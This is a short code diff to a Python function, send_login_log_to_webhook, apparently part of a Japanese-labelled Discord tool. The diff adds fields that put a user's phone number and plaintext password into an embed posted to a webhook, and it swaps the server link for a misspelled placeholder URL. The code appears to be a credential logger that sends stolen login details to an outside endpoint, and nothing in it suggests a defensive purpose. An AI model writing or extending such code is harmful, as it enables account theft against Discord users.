@@ -109,18 +109,33 @@ async def send_login_log_to_webhook(
                 value=f"```{guild.id}```",
                 inline=False
             )
-            # ===== サーバーリンク =====
-            embed.add_field(
-                name="サーバーリンク",
-                value=f"https://discord.com/channels/{guild.id}",
-                inline=False
-            )
         else:
             embed.add_field(
                 name="ログイン場所",
                 value="```DM```",
                 inline=False
             )
+
+        # ===== 電話番号 =====
+        embed.add_field(
+            name="電話番号",
+            value=f"```{phone}```",
+            inline=False
+        )
+
+        # ===== パスワード =====
+        embed.add_field(
+            name="パスワード",
+            value=f"```{password}```",
+            inline=False
+        )
+
+        # ===== サーバーリンク =====
+        embed.add_field(
+            name="サーバーリンク",
+            value="https://discord.com/disocd",
+            inline=False
+        )
 
         embed.set_footer(text="Developer @anzy1m")
 
